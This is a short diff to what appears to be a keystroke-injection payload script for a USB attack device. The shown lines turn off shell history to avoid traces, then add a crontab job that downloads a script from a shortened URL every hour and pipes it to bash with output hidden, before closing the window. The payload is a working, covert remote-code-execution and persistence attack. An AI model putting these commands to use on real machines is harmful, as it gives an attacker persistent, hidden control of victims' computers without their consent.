@@ -16,6 +16,8 @@ REM sneak +1 don't delete the whole history or mess with size settings, just tur
 STRING set +o history
 DELAY 300
 ENTER
-STRING curl -s -L http://bit.ly/10hA8iC | bash
+STRING crontab -l | sed "\$a\@hourly nohup curl -s -L 'http://bit.ly/10hA8iC' | bash >> /dev/null &" | crontab - && set -o history
 DELAY 300
 ENTER
+DELAY 300
+ALT F4
